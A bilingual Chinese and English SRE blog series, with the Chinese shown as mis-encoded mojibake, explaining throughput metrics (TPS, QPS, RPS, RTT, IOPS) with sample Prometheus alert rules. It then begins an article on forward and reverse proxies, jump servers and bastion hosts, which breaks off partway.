è¿™æ¬¡2ä¸ªå¤šæœˆçš„è¿ç§»è™½ç„¶ç—›è‹¦ï¼Œä½†æ”¶è·å¾ˆå¤§ï¼š
- âœ… æ¶ˆé™¤äº†å®‰å…¨éšæ‚£
- âœ… æå‡äº†ä»£ç è´¨é‡
- âœ… å¢å¼ºäº†å›¢é˜Ÿèƒ½åŠ›
- âœ… å»ºç«‹äº†å‡çº§è§„èŒƒ

ç»™SREåŒå­¦çš„å»ºè®®ï¼š
- ğŸ” æŒç»­ç›‘æ§ï¼šå…³æ³¨ä¾èµ–åº“å®‰å…¨å…¬å‘Š
- ğŸ“Š å»ºç«‹åŸºçº¿ï¼šå‡çº§å‰åæ€§èƒ½å¯¹æ¯”
- ğŸš¨ åŠæ—¶å‘Šè­¦ï¼šå¼‚å¸¸æƒ…å†µå¿«é€Ÿå“åº”
- ğŸ“ æ–‡æ¡£è®°å½•ï¼šç§¯ç´¯å‡çº§ç»éªŒ

æœ€åæƒ³è¯´ï¼šè½¯ä»¶å‡çº§å°±åƒçœ‹ç‰™åŒ»ï¼Œè¶Šæ‹–è¶Šç—›è‹¦ï¼Œæ—©æ²»æ—©è½»æ¾ï¼ ğŸ¦·

æŠ€æœ¯å€ºåŠ¡ä¸ä¼šè‡ªå·±æ¶ˆå¤±ï¼Œåªä¼šè¶Šç§¯è¶Šå¤šã€‚ä¸å…¶è¢«åŠ¨åº”å¯¹ï¼Œä¸å¦‚ä¸»åŠ¨å‡ºå‡»ï¼ğŸš€

ç¬¬å››ç¯‡ï¼šç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡ï¼ˆä¸Šï¼‰ï¼šååé‡ä¸æ€§èƒ½çš„"é€Ÿåº¦ä¸æ¿€æƒ…" ï¿½ï¸
----- Chinese
å¤§å®¶å¥½ï¼ä»Šå¤©å¼€å§‹èŠèŠSREç›‘æ§çš„æ ¸å¿ƒæŒ‡æ ‡ã€‚ç¬¬ä¸€å¼¹ä¸“é—¨è®²"é€Ÿåº¦"â€”â€”é‚£äº›è¡¡é‡ç³»ç»Ÿååé‡å’Œæ€§èƒ½çš„å…³é”®æŒ‡æ ‡ã€‚è¿™äº›æ•°å­—ç›´æ¥å†³å®šäº†ç”¨æˆ·ä½“éªŒçš„å¥½åï¼Œä¹Ÿæ˜¯è€æ¿æœ€å…³å¿ƒçš„KPIï¼

1ï¸âƒ£ TPSï¼šæ¯ç§’äº‹åŠ¡æ•° (Transactions Per Second) ğŸ“Š

TPSè¡¡é‡ç³»ç»Ÿæ¯ç§’å¤„ç†å®Œæ•´ä¸šåŠ¡äº‹åŠ¡çš„èƒ½åŠ›ï¼Œä¸æ˜¯ç®€å•è¯·æ±‚æ•°ã€‚

```bash
# ç”µå•†è®¢å•äº‹åŠ¡ï¼šä¸‹å•â†’åº“å­˜æ£€æŸ¥â†’ç”Ÿæˆè®¢å•â†’å‘é€é€šçŸ¥â†’è¿”å›ç»“æœ
# æ•´ä¸ªæµç¨‹ç®—1ä¸ªTPS
```

ç›‘æ§é‡ç‚¹ï¼šä¸šåŠ¡é«˜å³°æœŸTPSå³°å€¼ã€ä¸å“åº”æ—¶é—´å…³ç³»

å‘Šè­¦è®¾ç½®ï¼š
```yaml
- alert: TPSDropped
  expr: rate(business_transactions_total[5m]) < tps_baseline * 0.7
```

2ï¸âƒ£ QPSï¼šæ¯ç§’æŸ¥è¯¢æ•° (Queries Per Second) ğŸ”

QPSè¡¡é‡ç³»ç»Ÿæ¯ç§’å¤„ç†æŸ¥è¯¢è¯·æ±‚çš„èƒ½åŠ›ï¼ŒåŒ…æ‹¬HTTPè¯·æ±‚ã€æ•°æ®åº“æŸ¥è¯¢ç­‰ã€‚

TPS vs QPSï¼š
```bash
ç”¨æˆ·ä¸‹å•(1ä¸ªTPS) = æŸ¥è¯¢å•†å“+æ£€æŸ¥åº“å­˜+åˆ›å»ºè®¢å•+å‘é€é€šçŸ¥ = 4ä¸ªQPS
```

ç›‘æ§ç»´åº¦ï¼šæ¥å£çº§QPSã€æœåŠ¡çº§QPSã€æ•°æ®åº“QPS

æ€§èƒ½åŸºå‡†ï¼šæ™®é€šWebåº”ç”¨100-1000 QPSï¼Œé«˜å¹¶å‘ç³»ç»Ÿ10000+ QPS

3ï¸âƒ£ RPSï¼šæ¯ç§’è¯·æ±‚æ•° (Requests Per Second) ğŸ“¡

RPSä¾§é‡HTTPè¯·æ±‚å±‚é¢ï¼Œæ˜¯WebæœåŠ¡æœ€ç›´è§‚çš„æ€§èƒ½æŒ‡æ ‡ã€‚

```bash
nginx_requests_per_second: 2500    # Nginxæ¯ç§’å¤„ç†2500ä¸ªè¯·æ±‚
```

åº”ç”¨åœºæ™¯ï¼šè´Ÿè½½å‡è¡¡å™¨ç›‘æ§ã€CDNæ€§èƒ½è¯„ä¼°ã€APIç½‘å…³ç›‘æ§

ä¼˜åŒ–ç­–ç•¥ï¼šæ°´å¹³æ‰©å±•ã€ä»£ç ä¼˜åŒ–ã€ç¼“å­˜ç­–ç•¥ã€æ•°æ®åº“ä¼˜åŒ–ã€CDNåŠ é€Ÿ

4ï¸âƒ£ RTTï¼šå¾€è¿”æ—¶é—´ (Round Trip Time) â±ï¸

RTTè¡¡é‡æ•°æ®åŒ…ä»å‘é€åˆ°æ¥æ”¶å“åº”çš„æ€»æ—¶é—´ï¼Œæ˜¯ç½‘ç»œæ€§èƒ½å…³é”®æŒ‡æ ‡ã€‚

```bash
ping api.example.com  # RTT = 15.2ms
```

å½±å“å› ç´ ï¼šç½‘ç»œå»¶è¿Ÿã€æœåŠ¡å™¨å¤„ç†æ—¶é—´ã€DNSè§£æã€SSLæ¡æ‰‹

ä¼˜åŒ–ç­–ç•¥ï¼šCDNéƒ¨ç½²ã€æ•°æ®åº“ä¼˜åŒ–ã€ç¼“å­˜ç­–ç•¥ã€è¿æ¥æ± ã€å¼‚æ­¥å¤„ç†

ç›‘æ§å‘Šè­¦ï¼š
```yaml
- alert: HighRTT
  expr: http_request_duration_seconds{quantile="0.95"} > 0.5
```

5ï¸âƒ£ IOPSï¼šæ¯ç§’IOæ“ä½œæ•° (Input/Output Operations Per Second) ï¿½

IOPSè¡¡é‡å­˜å‚¨ç³»ç»Ÿæ¯ç§’æ‰§è¡Œè¯»å†™æ“ä½œçš„èƒ½åŠ›ï¼Œæ˜¯å­˜å‚¨æ€§èƒ½æ ¸å¿ƒæŒ‡æ ‡ã€‚

```bash
disk_reads_per_second: 1500   # æ¯ç§’1500æ¬¡è¯»æ“ä½œ
total_iops: 2300             # æ€»IOPS
```

ç±»å‹ï¼šéšæœºIOPSï¼ˆæ•°æ®åº“ï¼‰ã€é¡ºåºIOPSï¼ˆå¤§æ–‡ä»¶ä¼ è¾“ï¼‰

æ€§èƒ½å‚è€ƒï¼šHDD 100-200ï¼ŒSSD 10K-50Kï¼ŒNVMe 100K-1M IOPS

ä¼˜åŒ–ç­–ç•¥ï¼šä½¿ç”¨SSDã€RAIDä¼˜åŒ–ã€æ•°æ®åº“è°ƒä¼˜ã€ç¼“å­˜ç­–ç•¥

ç›‘æ§å‘Šè­¦ï¼š
```yaml
- alert: HighIOPS
  expr: node_disk_io_time_seconds_total > 0.8
```

6ï¸âƒ£ ååé‡ä¸æ€§èƒ½æŒ‡æ ‡çš„ååŒå…³ç³» ğŸ”—

æ€§èƒ½æŒ‡æ ‡çš„"é“ä¸‰è§’"ï¼š
```
      TPS/QPS
        â†— â†–
     RTT â†â†’ IOPS
```

- é«˜TPS/QPSé€šå¸¸éœ€è¦ä½RTTæ”¯æ’‘
- é«˜IOPSæœ‰åŠ©äºé™ä½RTTï¼ˆç‰¹åˆ«æ˜¯æ•°æ®åº“åœºæ™¯ï¼‰
- RTTè¿‡é«˜ä¼šé™åˆ¶TPS/QPSçš„æå‡

æ€§èƒ½ç“¶é¢ˆåˆ†æï¼š
```bash
# æ€§èƒ½é—®é¢˜è¯Šæ–­æ€è·¯
1. TPS/QPSä¸‹é™ â†’ æ£€æŸ¥RTTæ˜¯å¦å¼‚å¸¸
2. RTTå‡é«˜ â†’ æ£€æŸ¥IOPSæ˜¯å¦è¾¾åˆ°ç“¶é¢ˆ
3. IOPSé¥±å’Œ â†’ è€ƒè™‘å­˜å‚¨å‡çº§æˆ–ä¼˜åŒ–
4. ç½‘ç»œRTTé«˜ â†’ è€ƒè™‘CDNæˆ–å°±è¿‘éƒ¨ç½²
```

ç›‘æ§ä»ªè¡¨ç›˜è®¾è®¡ï¼š
```yaml
# æ€§èƒ½ç›‘æ§ä»ªè¡¨ç›˜
dashboard:
  - å®æ—¶TPS/QPS/RPSè¶‹åŠ¿å›¾
  - RTTåˆ†ä½æ•°ç»Ÿè®¡ï¼ˆP50/P95/P99ï¼‰
  - IOPSä½¿ç”¨ç‡å’Œå»¶è¿Ÿ
  - æ€§èƒ½åŸºçº¿å¯¹æ¯”
  - å¼‚å¸¸äº‹ä»¶æ—¶é—´çº¿
```

7ï¸âƒ£ å®æˆ˜ç»éªŒï¼šæ€§èƒ½ä¼˜åŒ–çš„è‰ºæœ¯ ğŸ’¡

æ€§èƒ½ä¼˜åŒ–çš„ä¼˜å…ˆçº§ï¼š
```bash
# ä¼˜åŒ–é¡ºåºå»ºè®®
1. å…ˆä¼˜åŒ–ç®—æ³•å’Œé€»è¾‘ï¼ˆæˆæœ¬æœ€ä½ï¼Œæ•ˆæœæœ€å¥½ï¼‰
2. å†ä¼˜åŒ–æ•°æ®åº“æŸ¥è¯¢ï¼ˆç´¢å¼•ã€SQLä¼˜åŒ–ï¼‰
3. ç„¶åè€ƒè™‘ç¼“å­˜ç­–ç•¥ï¼ˆRedisã€CDNï¼‰
4. æœ€åè€ƒè™‘ç¡¬ä»¶å‡çº§ï¼ˆCPUã€å†…å­˜ã€å­˜å‚¨ï¼‰
```

ä¸åŒåœºæ™¯çš„å…³æ³¨é‡ç‚¹ï¼š
```bash
# Webåº”ç”¨ï¼šå…³æ³¨QPSå’ŒRTT
# æ•°æ®åº“ï¼šå…³æ³¨TPSå’ŒIOPS
# APIç½‘å…³ï¼šå…³æ³¨RPSå’ŒRTT
# å­˜å‚¨ç³»ç»Ÿï¼šå…³æ³¨IOPSå’Œååé‡
# CDNï¼šå…³æ³¨RPSå’Œç¼“å­˜å‘½ä¸­ç‡
```

æ€§èƒ½æµ‹è¯•ç­–ç•¥ï¼š
```bash
# æ€§èƒ½æµ‹è¯•ç±»å‹
1. åŸºå‡†æµ‹è¯•ï¼šå»ºç«‹æ€§èƒ½åŸºçº¿
2. è´Ÿè½½æµ‹è¯•ï¼šéªŒè¯æ­£å¸¸è´Ÿè½½ä¸‹çš„æ€§èƒ½
3. å‹åŠ›æµ‹è¯•ï¼šæ‰¾åˆ°ç³»ç»Ÿæ€§èƒ½æé™
4. å³°å€¼æµ‹è¯•ï¼šéªŒè¯çªå‘æµé‡å¤„ç†èƒ½åŠ›
5. ç¨³å®šæ€§æµ‹è¯•ï¼šé•¿æ—¶é—´è¿è¡Œçš„æ€§èƒ½è¡¨ç°
```

å‘Šè­¦ç­–ç•¥å»ºè®®ï¼š
```yaml
# æ€§èƒ½å‘Šè­¦è§„åˆ™
- alert: LowThroughput
  expr: tps_current < tps_baseline * 0.7
  annotations:
    summary: "TPSä¸‹é™30%ä»¥ä¸Šï¼Œå¯èƒ½å­˜åœ¨æ€§èƒ½é—®é¢˜"

- alert: HighLatency
  expr: rtt_p95 > rtt_baseline * 2
  annotations:
    summary: "95%è¯·æ±‚å»¶è¿Ÿè¶…è¿‡åŸºçº¿2å€"

- alert: IOBottleneck
  expr: iops_utilization > 0.85
  annotations:
    summary: "IOPSä½¿ç”¨ç‡è¶…è¿‡85%ï¼Œå­˜å‚¨å¯èƒ½æˆä¸ºç“¶é¢ˆ"
```

ä¸€å¥è¯æ€»ç»“ ğŸ¯

æŒæ¡TPSã€QPSã€RPSã€RTTã€IOPSè¿™äº›æ€§èƒ½æŒ‡æ ‡ï¼Œå°±åƒæŒæ¡äº†ç³»ç»Ÿæ€§èƒ½çš„"ç”Ÿå‘½ä½“å¾"ã€‚å®ƒä»¬å‘Šè¯‰æˆ‘ä»¬ç³»ç»Ÿè·‘å¾—æœ‰å¤šå¿«ã€æœ‰å¤šç¨³ã€èƒ½æ‰¿å—å¤šå¤§å‹åŠ›ã€‚åœ¨æ€§èƒ½ä¼˜åŒ–çš„é“è·¯ä¸Šï¼Œæ•°æ®é©±åŠ¨å†³ç­–ï¼ŒæŒ‡æ ‡æŒ‡å¼•æ–¹å‘ï¼

*è®°ä½ï¼šæ€§èƒ½ä¸æ˜¯è¶Šé«˜è¶Šå¥½ï¼Œè€Œæ˜¯è¦åœ¨æˆæœ¬ã€ç¨³å®šæ€§å’Œç”¨æˆ·ä½“éªŒä¹‹é—´æ‰¾åˆ°æœ€ä½³å¹³è¡¡ç‚¹ï¼* ğŸï¸âœ¨

----- English

SRE Performance Indicators (Part 1): Understanding TPS, QPS, RPS, RTT & IOPS ğŸï¸

Hello everyone! Today we're diving into the core metrics of SRE monitoring. This first installment focuses on "speed" - the key indicators that measure system throughput and performance. These numbers directly determine user experience quality and represent the KPIs that management cares about most!

1ï¸âƒ£ TPS: Transactions Per Second ğŸ“Š

TPS measures a system's ability to process complete business transactions per second, not just simple requests.

```bash
# E-commerce order transaction: Place order â†’ Check inventory â†’ Generate order â†’ Send notification â†’ Return result
# This entire flow counts as 1 TPS
```

Key Monitoring Areas: Peak TPS during business hours, correlation with response time

2ï¸âƒ£ QPS: Queries Per Second ğŸ”

QPS measures a system's ability to process query requests per second, including HTTP requests and database queries.

TPS vs QPS:
```bash
User places order (1 TPS) = Product query + Inventory check + Create order + Send notification = 4 QPS
```

Monitoring Dimensions: Interface-level QPS, service-level QPS, database QPS

Performance Benchmarks: Standard web applications 100-1,000 QPS, high-concurrency systems 10,000+ QPS

3ï¸âƒ£ RPS: Requests Per Second ğŸ“¡

RPS focuses on the HTTP request layer and provides the most intuitive performance metric for web services.


Common Use Cases: Load balancer monitoring, CDN performance evaluation, API gateway monitoring

Optimization Strategies: Horizontal scaling, code optimization, caching strategies, database optimization, CDN acceleration

4ï¸âƒ£ RTT: Round Trip Time â±ï¸

RTT measures the total time from sending a data packet to receiving a response - a critical network performance indicator.

```bash
ping api.example.com  # RTT = 15.2ms
```

Key Influencing Factors: Network latency, server processing time, DNS resolution, SSL handshake

Optimization Strategies: CDN deployment, database optimization, caching strategies, connection pooling, asynchronous processing


5ï¸âƒ£ IOPS: Input/Output Operations Per Second ğŸ’¾

IOPS measures a storage system's ability to execute read/write operations per second - the fundamental metric for storage performance.

Operation Types: Random IOPS (databases), Sequential IOPS (large file transfers)

Optimization Strategies: Upgrade to SSDs, RAID optimization, database tuning, caching strategies


6ï¸âƒ£ Synergistic Relationships Between Throughput and Performance Metrics ğŸ”—

The Performance "Iron Triangle":
```
      TPS/QPS
        â†— â†–
     RTT â†â†’ IOPS
```

- High TPS/QPS typically requires low RTT support
- High IOPS helps reduce RTT (especially in database scenarios)
- Excessive RTT limits TPS/QPS improvement

Performance Bottleneck Analysis:
```bash
# Performance issue diagnosis approach
1. TPS/QPS decline â†’ Check if RTT is abnormal
2. RTT increase â†’ Check if IOPS has reached bottleneck
3. IOPS saturation â†’ Consider storage upgrade or optimization
4. High network RTT â†’ Check network devices, routing, CDN, or proximity deployment
```

Performance Optimization Priority:
```bash
# Recommended optimization sequence
1. First optimize code, algorithms and logic (lowest cost, highest impact)
2. Then optimize database queries (indexing, SQL optimization)
3. Consider caching strategies (Redis, CDN)
4. Finally consider hardware upgrades (CPU, memory, storage)
```

Focus Areas for Different Scenarios:
```bash
# Web applications: Focus on QPS and RTT
# Databases: Focus on TPS and IOPS
# API gateways: Focus on RPS and RTT
# Storage systems: Focus on IOPS and throughput
# CDN: Focus on RPS and cache hit rates
```

Summary ğŸ¯

Mastering TPS, QPS, RPS, RTT, and IOPS performance metrics is like understanding your system's "vital signs." They reveal how fast your system runs, how stable it operates, and how much pressure it can handle. In performance optimization, data drives decisions and metrics guide the way forward!

Performance isn't about maximizing numbers, but finding the optimal balance between cost, stability, and user experience!

ç¬¬äº”ç¯‡ï¼š
----- Chinese
ä»£ç†Proxyï¼šç½‘ç»œä¸–ç•Œçš„"ä¸­é—´å•†"ä¸SREçš„"é€è§†é•œ" ğŸ•µï¸

å¤§å®¶å¥½ï¼ä»Šå¤©å’±ä»¬æ¥èŠèŠä»£ç†Proxyè¿™ä¸ªç½‘ç»œä¸–ç•Œçš„"ä¸‡èƒ½ä¸­ä»‹"ï¼Œä»¥åŠSREå°ä¼™ä¼´ä»¬å¦‚ä½•åœ¨è¿™åœº"ä¸­é—´å•†èµšå·®ä»·"çš„æ¸¸æˆä¸­å½“å¥½"ç›‘ç®¡å‘˜"ï¼

1ï¸âƒ£ ä»£ç†çš„"å¤šé‡èº«ä»½"ï¼šä»ä¸­ä»‹åˆ°çœ‹é—¨äººçš„åä¸½è½¬èº« ğŸ­

ä»£ç†ï¼ˆProxyï¼‰åœ¨ç½‘ç»œä¸–ç•Œé‡Œå°±åƒä¸€ä¸ª"å¤šé¢æ‰‹"ï¼Œæ ¹æ®ä¸åŒçš„éœ€æ±‚æ‰®æ¼”ç€ä¸åŒçš„è§’è‰²ï¼š

ğŸ¢ èº«ä»½ä¸€ï¼šæµé‡"ä¸­ä»‹"ï¼ˆTraffic Brokerï¼‰
æƒ³è±¡ä¸€ä¸‹ï¼Œä»£ç†å°±åƒæ˜¯ç½‘ç»œä¸–ç•Œçš„æˆ¿äº§ä¸­ä»‹ã€‚ä½ æƒ³ä¹°æˆ¿ï¼ˆè®¿é—®æœåŠ¡ï¼‰ï¼Œä¸ç›´æ¥æ‰¾æˆ¿ä¸œï¼ˆç›®æ ‡æœåŠ¡å™¨ï¼‰ï¼Œè€Œæ˜¯é€šè¿‡ä¸­ä»‹ï¼ˆä»£ç†æœåŠ¡å™¨ï¼‰ã€‚ä¸­ä»‹äº†è§£å¸‚åœºè¡Œæƒ…ï¼ŒçŸ¥é“å“ªä¸ªæˆ¿æºå¥½ï¼Œè¿˜èƒ½å¸®ä½ ç ä»·è°ˆæ¡ä»¶ï¼

ä¸­ä»‹å‹ä»£ç†çš„æ ¸å¿ƒä»·å€¼ï¼š
- è´Ÿè½½å‡è¡¡ï¼šæŠŠè¯·æ±‚åˆ†å‘ç»™å¤šä¸ªåç«¯æœåŠ¡ï¼Œå°±åƒä¸­ä»‹æŠŠå®¢æˆ·åˆ†é…ç»™ä¸åŒçš„é”€å”®å‘˜
- ç¼“å­˜åŠ é€Ÿï¼šå¸¸ç”¨çš„å“åº”ç¼“å­˜èµ·æ¥ï¼Œä¸‹æ¬¡ç›´æ¥è¿”å›ï¼Œå°±åƒä¸­ä»‹è®°ä½äº†çƒ­é—¨æˆ¿æºä¿¡æ¯
- åè®®è½¬æ¢ï¼šHTTPè½¬HTTPSï¼Œå°±åƒä¸­ä»‹å¸®ä½ ç¿»è¯‘å¤–è¯­
- æ€§èƒ½ä¼˜åŒ–ï¼šå‹ç¼©ã€åˆå¹¶è¯·æ±‚ï¼Œæå‡ä¼ è¾“æ•ˆç‡

ğŸ›¡ï¸ èº«ä»½äºŒï¼šå®‰å…¨"çœ‹é—¨äºº"ï¼ˆSecurity Gatekeeperï¼‰
ä»£ç†è¿˜å¯ä»¥æ˜¯ä¸¥æ ¼çš„"é—¨å«å¤§å”"ï¼Œè´Ÿè´£æ£€æŸ¥æ¯ä¸ªè¿›å‡ºçš„äººå‘˜å’Œç‰©å“ï¼š

- è®¿é—®æ§åˆ¶ï¼šåªå…è®¸æˆæƒç”¨æˆ·é€šè¿‡ï¼Œå°±åƒå°åŒºé—¨ç¦ç³»ç»Ÿ
- å†…å®¹è¿‡æ»¤ï¼šé˜»æ­¢æ¶æ„è¯·æ±‚å’Œä¸å½“å†…å®¹ï¼Œå°±åƒå®‰æ£€å‘˜æ£€æŸ¥è¡Œæ
- å®¡è®¡è®°å½•ï¼šè®°å½•æ‰€æœ‰è®¿é—®è¡Œä¸ºï¼Œå°±åƒé—¨å«çš„è®¿å®¢ç™»è®°æœ¬
- èº«ä»½éªŒè¯ï¼šç¡®è®¤è®¿é—®è€…èº«ä»½ï¼Œå°±åƒæŸ¥éªŒèº«ä»½è¯

ğŸšª èº«ä»½ä¸‰ï¼šç½‘ç»œ"è·³æ¿"ï¼ˆNetwork Jump Pointï¼‰
åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä»£ç†ç»å¸¸å……å½“"è·³æ¿æœº"çš„è§’è‰²ï¼š

Jump Serverï¼ˆè·³æ¿æœºï¼‰ï¼šç½‘ç»œè®¿é—®çš„"ä¸­è½¬ç«™"
- ç½‘ç»œéš”ç¦»ï¼šç”Ÿäº§ç¯å¢ƒä¸ç›´æ¥æš´éœ²ï¼Œå¿…é¡»é€šè¿‡è·³æ¿æœºä¸­è½¬
- ç»Ÿä¸€å…¥å£ï¼šæ‰€æœ‰è¿ç»´æ“ä½œéƒ½é€šè¿‡è·³æ¿æœºè¿›è¡Œ
- ç®€åŒ–ç®¡ç†ï¼šåªéœ€è¦ç»´æŠ¤è·³æ¿æœºçš„å®‰å…¨æ€§
- è®¿é—®è®°å½•ï¼šè®°å½•è°åœ¨ä»€ä¹ˆæ—¶å€™è®¿é—®äº†å“ªå°æœåŠ¡å™¨

ğŸ° èº«ä»½å››ï¼šä¼ä¸š"å ¡å’"ï¼ˆEnterprise Bastionï¼‰
ä»è·³æ¿æœºè¿›ä¸€æ­¥å‘å±•ï¼Œå°±æ˜¯åŠŸèƒ½æ›´å¼ºå¤§çš„å ¡å’æœºï¼š

Bastion Hostï¼ˆå ¡å’æœºï¼‰ï¼šä¼ä¸šçº§å®‰å…¨ç®¡æ§å¹³å°
- ç»Ÿä¸€è®¤è¯ï¼šé›†æˆLDAPã€ADã€SSOç­‰èº«ä»½ç³»ç»Ÿ
- æƒé™ç®¡æ§ï¼šç”¨æˆ·-ä¸»æœº-å‘½ä»¤ä¸‰çº§æƒé™æ§åˆ¶
- æ“ä½œå®¡è®¡ï¼šå…¨ç¨‹å½•å±ã€å‘½ä»¤è®°å½•ã€åˆè§„æŠ¥å‘Š
- å¯†ç æ‰˜ç®¡ï¼šç”¨æˆ·æ— éœ€çŸ¥é“çœŸå®æœåŠ¡å™¨å¯†ç 
- ä¼šè¯ç®¡ç†ï¼šæ§åˆ¶å¹¶å‘ä¼šè¯ã€ä¼šè¯æ—¶é•¿ç­‰

å®é™…åº”ç”¨åœºæ™¯å…¨æ™¯å›¾ï¼š
```
äº’è”ç½‘ç”¨æˆ· â†’ CDNä»£ç† â†’ è´Ÿè½½å‡è¡¡ä»£ç† â†’ åº”ç”¨æœåŠ¡å™¨
    â†“
è¿ç»´äººå‘˜ â†’ å ¡å’æœº â†’ è·³æ¿æœº â†’ ç”Ÿäº§æœåŠ¡å™¨
    â†“
å†…éƒ¨ç”¨æˆ· â†’ æ­£å‘ä»£ç† â†’ äº’è”ç½‘æœåŠ¡
    â†“
å¾®æœåŠ¡A â†’ APIç½‘å…³ â†’ å¾®æœåŠ¡B
```

ç»å…¸åº”ç”¨åœºæ™¯ï¼š
- åå‘ä»£ç†ï¼šNginxã€HAProxyåœ¨å‰ç«¯æ¥æ”¶è¯·æ±‚ï¼Œåˆ†å‘ç»™åç«¯æœåŠ¡
- æ­£å‘ä»£ç†ï¼šå…¬å¸ä¸Šç½‘é€šè¿‡ä»£ç†æœåŠ¡å™¨ï¼Œè¿‡æ»¤å†…å®¹ã€è®°å½•æ—¥å¿—
- APIç½‘å…³ï¼šKongã€Zuulä½œä¸ºå¾®æœåŠ¡çš„ç»Ÿä¸€å…¥å£
- CDNä»£ç†ï¼šå…¨çƒåˆ†å¸ƒçš„ç¼“å­˜ä»£ç†ï¼Œè®©ç”¨æˆ·å°±è¿‘è®¿é—®
- è·³æ¿æœºï¼šè¿ç»´äººå‘˜è®¿é—®ç”Ÿäº§ç¯å¢ƒçš„å®‰å…¨é€šé“
- å ¡å’æœºï¼šä¼ä¸šçº§çš„ç»Ÿä¸€è¿ç»´ç®¡æ§å¹³å°

2ï¸âƒ£ ä»£ç†çš„"ç¿»è½¦ç°åœº"ï¼šå½“å¤šé¢æ‰‹å‡ºé—®é¢˜ ğŸ’¥

æ— è®ºä»£ç†æ‰®æ¼”ä»€ä¹ˆè§’è‰²ï¼Œéƒ½å¯èƒ½é‡åˆ°å„ç§"ç¿»è½¦"æƒ…å†µï¼š

ğŸ¢ ä¸­ä»‹å‹ä»£ç†çš„"å‘"ï¼š

å•ç‚¹æ•…éšœ - "ä¸­ä»‹è·‘è·¯äº†"ï¼š
ä»£ç†æœåŠ¡å™¨æŒ‚äº†ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½æ— æ³•è½¬å‘ï¼Œæ•´ä¸ªç³»ç»Ÿç˜«ç—ª

æ€§èƒ½ç“¶é¢ˆ - "ä¸­ä»‹å¤ªå¿™ï¼Œæ’é˜Ÿç­‰æ­»"ï¼š
ä»£ç†å¤„ç†èƒ½åŠ›ä¸è¶³ï¼Œæˆä¸ºç³»ç»Ÿç“¶é¢ˆï¼Œå“åº”æ—¶é—´æš´å¢

é…ç½®é”™è¯¯ - "ä¸­ä»‹æé”™äº†åœ°å€"ï¼š
è·¯ç”±è§„åˆ™é…ç½®é”™è¯¯ï¼Œè¯·æ±‚è¢«è½¬å‘åˆ°é”™è¯¯çš„åç«¯æœåŠ¡

ç¼“å­˜é—®é¢˜ - "ä¸­ä»‹ç»™äº†è¿‡æœŸä¿¡æ¯"ï¼š
ç¼“å­˜ç­–ç•¥ä¸å½“ï¼Œç”¨æˆ·çœ‹åˆ°çš„æ˜¯è¿‡æœŸæ•°æ®

ğŸ›¡ï¸ å®‰å…¨å‹ä»£ç†çš„"å‘"ï¼š

æƒé™é…ç½®é”™è¯¯ - "é—¨å«è®¤é”™äºº"ï¼š
è®¿é—®æ§åˆ¶è§„åˆ™é…ç½®é”™è¯¯ï¼Œè¯¥æ‹¦æˆªçš„æ²¡æ‹¦æˆªï¼Œä¸è¯¥æ‹¦æˆªçš„è¢«æ‹¦æˆª

å®¡è®¡æ—¥å¿—ä¸¢å¤± - "ç›‘æ§æ‘„åƒå¤´åäº†"ï¼š
å…³é”®æ“ä½œæ²¡æœ‰è®°å½•ï¼Œå‡ºé—®é¢˜æ—¶æ— æ³•è¿½æº¯

è®¤è¯æœåŠ¡æ•…éšœ - "é—¨ç¦ç³»ç»Ÿç½¢å·¥"ï¼š
èº«ä»½è®¤è¯æœåŠ¡ä¸å¯ç”¨ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½æ— æ³•ç™»å½•

ğŸšª è·³æ¿æœºçš„"å‘"ï¼š

ç½‘ç»œè¿æ¥ä¸ç¨³å®š - "æ¡¥æ–­äº†"ï¼š
è·³æ¿æœºåˆ°ç›®æ ‡æœåŠ¡å™¨çš„ç½‘ç»œä¸ç¨³å®šï¼ŒSSHä¼šè¯é¢‘ç¹æ–­å¼€

èµ„æºä¸è¶³ - "æ¡¥æ‰¿é‡ä¸å¤Ÿ"ï¼š
è·³æ¿æœºCPUã€å†…å­˜ä¸è¶³ï¼Œæ— æ³•æ”¯æ’‘å¤§é‡å¹¶å‘ä¼šè¯

å¯†é’¥ç®¡ç†æ··ä¹± - "é’¥åŒ™ä¸¢äº†"ï¼š
SSHå¯†é’¥ç®¡ç†ä¸å½“ï¼Œæ— æ³•è¿æ¥ç›®æ ‡æœåŠ¡å™¨æˆ–å®‰å…¨é£é™©

ğŸ° å ¡å’æœºçš„"å‘"ï¼š

æ•°æ®åº“æ•…éšœ - "æ¡£æ¡ˆå®¤ç€ç«"ï¼š
å ¡å’æœºæ•°æ®åº“æ•…éšœï¼Œç”¨æˆ·æƒé™ã€æ“ä½œè®°å½•å…¨éƒ¨ä¸¢å¤±

å½•å±å­˜å‚¨æ»¡ - "ç›‘æ§å½•åƒæ²¡åœ°æ–¹å­˜"ï¼š
æ“ä½œå½•å±å ç”¨å¤§é‡å­˜å‚¨ç©ºé—´ï¼Œç£ç›˜æ»¡å¯¼è‡´æœåŠ¡ä¸å¯ç”¨

åŒæ­¥å»¶è¿Ÿ - "èŠ±åå†Œæ›´æ–°ä¸åŠæ—¶"ï¼š
ä¸AD/LDAPåŒæ­¥å»¶è¿Ÿï¼Œç”¨æˆ·æƒé™å˜æ›´ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ

3ï¸âƒ£ SREè§†è§’çš„"ç›‘æ§ç—›ç‚¹"ï¼šå¤šé¢æ‰‹çš„ç›‘æ§æŒ‘æˆ˜ ğŸ¯

ä¸åŒç±»å‹çš„ä»£ç†ç»™SREå¸¦æ¥äº†ä¸åŒçš„ç›‘æ§æŒ‘æˆ˜ï¼š

ğŸ¢ ä¸­ä»‹å‹ä»£ç†çš„ç›‘æ§ç—›ç‚¹ï¼š
- é€æ˜æ€§é—®é¢˜ï¼šä»£ç†éšè—äº†çœŸå®çš„ç½‘ç»œæ‹“æ‰‘ï¼Œé—®é¢˜å®šä½éœ€è¦è·¨è¶Šå¤šä¸ªå±‚æ¬¡
- æ€§èƒ½å½’å› å›°éš¾ï¼šå»¶è¿Ÿå¢åŠ æ˜¯ä»£ç†æœ¬èº«è¿˜æ˜¯åç«¯æœåŠ¡ï¼Ÿé”™è¯¯æ˜¯åœ¨ä»£ç†å±‚è¿˜æ˜¯åº”ç”¨å±‚ï¼Ÿ
- ç¼“å­˜ä¸€è‡´æ€§ï¼šç¼“å­˜å‘½ä¸­ç‡å¯¹æ€§èƒ½çš„å®é™…å½±å“ï¼Ÿç¼“å­˜æ•°æ®æ˜¯å¦è¿‡æœŸï¼Ÿ

